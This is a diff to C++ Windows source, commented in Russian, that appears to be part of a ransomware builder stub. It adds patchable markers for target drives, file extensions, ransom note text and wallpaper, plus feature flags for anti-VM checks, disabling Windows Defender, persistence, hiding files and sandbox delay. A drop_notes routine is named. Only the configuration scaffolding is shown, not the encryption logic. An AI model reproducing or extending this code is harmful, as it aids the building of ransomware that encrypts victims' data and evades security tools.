@@ -21,6 +21,8 @@
 // ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ С МАРКЕРАМИ ДЛЯ ПАТЧИНГА
 // ============================================================
 #pragma data_seg(".rdata")
+
+// МАРКЕРЫ ДЛЯ СТРОКОВЫХ ПЕРЕМЕННЫХ
 const char MARKER_DRIVES[] = "####DRIVES_START####";
 const char MARKER_EXTS[] = "####EXTS_START####";
 const char MARKER_EXCLUDE[] = "####EXCLUDE_START####";
@@ -31,6 +33,17 @@ const char MARKER_NOTE_CONTENT[] = "####NOTE_CONTENT_START####";
 const char MARKER_FAKE_NAME[] = "####FAKE_NAME_START####";
 const char MARKER_WALL_BASE64[] = "####WALL_BASE64_START####";
 const char MARKER_WALL_EXT[] = "####WALL_EXT_START####";
+
+// МАРКЕРЫ ДЛЯ БУЛЕВЫХ ПЕРЕМЕННЫХ (ДОБАВЛЕНЫ!)
+const char MARKER_ALGO[] = "####ALGO_START####";
+const char MARKER_FAKE_ENABLED[] = "####FAKE_ENABLED_START####";
+const char MARKER_HIDE_ENABLED[] = "####HIDE_ENABLED_START####";
+const char MARKER_ANTI_VM[] = "####ANTI_VM_START####";
+const char MARKER_DISABLE_DEFENDER[] = "####DISABLE_DEFENDER_START####";
+const char MARKER_PERSISTENCE[] = "####PERSISTENCE_START####";
+const char MARKER_HIDE_FILES[] = "####HIDE_FILES_START####";
+const char MARKER_SANDBOX_DELAY[] = "####SANDBOX_DELAY_START####";
+
 #pragma data_seg()
 
 // Сами переменные (идут СРАЗУ за маркерами)
@@ -431,7 +444,7 @@ void drop_notes(const std::vector<std::string>& drives,
 // ============================================================
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     // ============================================================
-    // ПРИНУДИТЕЛЬНОЕ СОХРАНЕНИЕ МАРКЕРОВ (чтобы компилятор не вырезал)
+    // ПРИНУДИТЕЛЬНОЕ СОХРАНЕНИЕ ВСЕХ МАРКЕРОВ (ВКЛЮЧАЯ БУЛЕВЫЕ)
     // ============================================================
     (void)MARKER_DRIVES;
     (void)MARKER_EXTS;
@@ -443,6 +456,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     (void)MARKER_FAKE_NAME;
     (void)MARKER_WALL_BASE64;
     (void)MARKER_WALL_EXT;
+    (void)MARKER_ALGO;
+    (void)MARKER_FAKE_ENABLED;
+    (void)MARKER_HIDE_ENABLED;
+    (void)MARKER_ANTI_VM;
+    (void)MARKER_DISABLE_DEFENDER;
+    (void)MARKER_PERSISTENCE;
+    (void)MARKER_HIDE_FILES;
+    (void)MARKER_SANDBOX_DELAY;
     
     srand(GetTickCount() ^ GetCurrentProcessId());
     
